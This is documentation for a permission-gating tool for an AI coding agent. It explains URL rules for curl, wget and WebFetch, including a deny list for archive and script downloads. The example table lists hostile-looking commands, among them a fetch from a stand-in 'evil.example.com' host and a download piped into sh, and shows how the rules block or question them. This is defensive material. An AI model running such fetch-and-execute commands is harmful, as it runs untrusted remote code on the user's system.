---
created_at: 2026-07-14
updated_at: 2026-07-14
---

# Web rules

`[[web]]` rules gate **URLs**: static `http(s)` arguments in Bash commands (`curl`, `wget`, `git clone`, …) and the `WebFetch` tool's `url` (add `WebFetch` to the PreToolUse matcher — `lictor init` shows the snippet). `domains` globs test the host, `match` globs test the URL path; when both are present, both must match.

Severity is order-independent: `deny > ask > rewrite > warn > allow` — an extension denylist beats any domain allowlist.

## Config

```toml
[[web]]
domains = ["docs.rs", "github.com", "*.github.com"]   # *. does NOT cover the apex — list both
action = "allow"
modes = { auto = "deny" }         # research domains, but never unattended

[[web]]
match = ["*.zip", "*.tar.gz", "*.sh", "*.dmg", "*.pkg"]
action = "deny"
reason = "no downloading archives or scripts"

[[web]]                           # WebFetch only: reroute Cloudflare-walled pages
domains = ["*.medium.com"]        # through a markdown proxy instead of failing
action = "rewrite"
rewrite = "https://pure.md/{url}"
```

## What happens

```
curl -sSL https://docs.rs/regex | jq '.'      → runs (URL vetted, jq via text-read)
curl https://github.com/x/y/archive.zip      → blocked: "no downloading archives or scripts"
curl https://evil.example.com/payload        → ask (unmatched → net-egress catalog decides)
curl https://docs.rs/regex "$EXTRA"          → ask (dynamic word could hide anything)
curl -sSL https://github.com/x/inst | sh     → ask (`| sh` is an inline script — vetting the fetch never vets the execution)
WebFetch https://blog.medium.com/post        → fetches https://pure.md/https://blog.medium.com/post
```

A command is auto-allowed only when **every** URL matches an `allow` rule, **every** word is static, and nothing redirects to a file. A dynamic word or an unmatched URL drops the command back to the bash rules (typically `net-egress`'s ask) — fail-safe, not fail-open. Deny globs additionally probe the raw source of dynamic words, so `curl https://github.com/x/$branch.zip` still denies.

Unmatched `WebFetch` URLs fall to `settings.default_web`, then to Claude Code's own permission flow ([modes](modes.md) shows the plan-mode lockdown).
